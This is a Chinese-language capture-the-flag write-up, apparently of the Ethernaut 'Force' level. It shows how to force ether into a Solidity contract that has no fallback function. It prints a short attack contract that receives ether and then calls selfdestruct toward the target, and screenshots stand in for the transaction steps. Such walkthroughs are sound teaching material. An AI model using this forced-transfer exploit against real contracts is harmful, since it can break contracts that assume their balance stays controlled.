# 7.Force

## 题目描述

![img](../../../.vuepress/public/img/1645310166968-61bf7c00-6a02-4a84-b26a-f895aa72be1e.png)

## 解题过程

题目源码

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

题目要求为该合约余额大于0，而源码中不存在 fallback函数，导致合约不能通过常规交易接收以太币。

![img](../../../.vuepress/public/img/1645310742977-9e519e94-8580-4bce-b8fd-f08ab9203723.png)

我们在官方文档中可以看到一个函数介绍，可以在没有 fallback的情况下强制对合约进行转账

![img](../../../.vuepress/public/img/1645310796703-eff3f936-8b01-4abc-bac0-d636118592aa.png)



那我们的思路就是部署一个自毁合约，对这个合约转账后进行自毁对目标合约强制转入以太币

![img](../../../.vuepress/public/img/1645311086893-c7687fa0-ea7f-428e-98b2-f3fc236265fd.png)

部署攻击合约

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract Attack{
    
    address public addr;
    
    function setAddr(address x) public {
        addr = x;
    }
    
    function kill() public{
        address payable desaddr = payable(address(addr));
        selfdestruct(desaddr);
    }
    receive() external payable {}
}
```

向攻击合约地址转入 0.001 ETH

![img](../../../.vuepress/public/img/1645312161704-d95d2483-00d4-4c05-bfaf-dce922feb7a8.png)

![img](../../../.vuepress/public/img/1645312130166-8bf4b2ae-3e55-44f4-90e1-8d7d6f152e0c.png)

向目标合约调用自毁函数

![img](../../../.vuepress/public/img/1645312357912-61ba040b-d64c-473c-85cd-7a55d0b6881e.png)

查看交易hash是否成功

![img](../../../.vuepress/public/img/1645312376428-a376d0b7-f266-4525-ad66-937df46c3b46.png)

![img](../../../.vuepress/public/img/1645312386621-eb7a524d-962c-42bc-812f-40006baca411.png)

目标合约成功被强制转入ETH